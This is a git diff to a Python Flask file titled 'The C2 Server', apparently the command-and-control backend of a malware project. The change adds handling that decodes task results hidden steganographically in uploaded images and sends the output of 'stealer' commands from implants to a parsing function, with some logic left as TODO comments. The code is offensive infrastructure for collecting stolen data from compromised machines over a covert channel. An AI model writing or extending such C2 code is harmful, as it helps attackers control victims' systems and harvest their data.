@@ -1,8 +1,10 @@
 # The C2 Server
+import json
 import os
 from datetime import datetime
-import json
+
 import config
+import Steganography
 import tools
 from decouple import config
 from flask import (Flask, jsonify, make_response, redirect, render_template,
@@ -12,8 +14,7 @@ from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
                                 get_jwt_identity, jwt_required,
                                 unset_jwt_cookies)
 from psycopg2 import connect, sql
-
-import Steganography
+import WyattWonderland
 
 app = Flask(__name__)
 CORS(app)
@@ -207,7 +208,28 @@ def handle_response():
     try:
         file = request.files['file']
         string_rep = Steganography.decode(Steganography.iio.imread(file))
-        json.loads(string_rep)
+        data = json.loads(string_rep)
+        
+        for index in data: 
+            target_implant_id = index['target_implant_id']
+            task_id = index['task_id']
+            response_data = index['response_data']
+            success = index['success']
+            command = index['command']
+
+            if "stealer" in command: 
+                # TODO call Wyatt's function 
+                 response_data = WyattWonderland.parsejson(response_data)
+            
+            # DUMP BACK INTO TASK_QUEUE 
+            
+
+            
+
+
+
+
+
 
         # img = iio.imread("doge.png")
         # iio.imwrite("doge_encoded.png", encode(img, "HelloWorld"))
